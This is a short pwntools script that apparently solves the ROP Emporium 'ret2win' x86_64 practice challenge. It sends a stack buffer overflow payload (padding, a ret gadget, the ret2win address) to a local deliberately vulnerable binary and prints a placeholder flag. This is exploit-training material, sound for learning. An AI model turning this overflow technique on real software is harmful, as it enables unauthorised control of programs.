# https://ropemporium.com/challenge/ret2win.html
# ROPE{a_placeholder_32byte_flag!}\
# x86_64
# ropemporium.com

from pwn import *

exp = process("./ret2win")
ret2win = p64(0x400756)
padding = b'A'*40
ret = p64(0x40053e)
payload = padding + ret + ret2win
exp.sendline(payload)
print(exp.recvall().decode())
